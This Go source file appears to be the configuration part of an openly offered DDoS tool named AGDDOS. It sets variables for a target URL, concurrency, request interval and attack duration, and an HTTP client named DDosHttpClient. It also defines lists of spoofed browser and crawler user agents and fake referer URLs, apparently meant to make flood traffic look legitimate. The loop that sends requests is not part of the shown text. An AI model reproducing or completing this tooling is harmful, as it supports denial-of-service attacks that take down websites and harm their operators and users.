package main

import (
	"context"
	"net"
	"net/http"
	"time"
)

const (
	WelcomeMsg = "\n" +
		"+----------------------------------------------------------------+ \n" +
		"| Welcome to use AGDDOS                                          | \n" +
		"| Code by AGTeam                                                 | \n" +
		"| If you have some problem when you use the tool,                | \n" +
		"| please submit issue at : https://github.com/AGDDoS/AGDDoS      | \n" +
		"+----------------------------------------------------------------+"
)

var (
	UserAgents = []string{
		"Baiduspider-image+(+http://www.baidu.com/search/spider.htm)",
		"Baiduspider-render/2.0; (+http://www.baidu.com/search/spider.html)",
		"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; en) Presto/2.8.131 Version/11.11",
		"Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11",
		"Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; The World)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Maxthon 2.0)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)",
		"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
		"Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920)",
		"Mozilla/5.0 (compatible; Googlebot-Image/1.0; +http://www.google.com/bot.html)",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
		"Mozilla/5.0 (iPod; U; CPU iPhone OS 3_3 like Mac OS X; apn-IN) AppleWebKit/534.32.3 (KHTML, like Gecko) Version/4.0.5 Mobile/8B112 Safari/6534.32.3",
		"Mozilla/5.0 (iPod; U; CPU iPhone OS 4_1 like Mac OS X; ky-KG) AppleWebKit/535.26.5 (KHTML, like Gecko) Version/4.0.5 Mobile/8B119 Safari/6535.26.5",
		"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7) AppleWebKit/536.1 (KHTML, like Gecko) Chrome/36.0.861.0 Safari/536.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_2_1 like Mac OS X) AppleWebKit/531.2 (KHTML, like Gecko) FxiOS/10.9t7093.0 Mobile/11B127 Safari/531.2",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_2_1 like Mac OS X) AppleWebKit/536.0 (KHTML, like Gecko) CriOS/36.0.857.0 Mobile/99E350 Safari/536.0",
	}

	Refs = []string{
		"https://www.google.com/search?q=",
		"https://check-host.net/",
		"https://www.facebook.com/",
		"http://www.scicat.cn/e/search/index.php?word=",
		"https://www.youtube.com/",
		"https://www.ip138.com/iplookup.asp?action=2&ip=",
		"https://www.bing.com/search?q=",
		"https://r.search.yahoo.com/",
		"http://www.heikesz.com/web/?q=",
		"https://vk.com/profile.php?redirect=",
		"https://vulsee.com/?s=",
		"https://help.baidu.com/searchResult?keywords=",
		"https://steamcommunity.com/market/search?q=",
		"https://www.xn--flw351e.cf/search?q=",
	}

	// HTTP Client
	Method              string
	TargetUrl           string
	IntervalMillisecond int
	ConcurrencyCount    int
	DurationMinute      int
	Totalrequest        int64

	DDosHttpClient = &http.Client{
		Transport: &http.Transport{
			DialContext: func(ctx context.Context, network, addr string) (conn net.Conn, e error) {
				dialer := net.Dialer{
					Timeout:   30 * time.Second, // 超时时间
					KeepAlive: 60 * time.Second, // KeepAlive时间
				}
				return dialer.Dial(network, addr)
			},
		},
	}
)
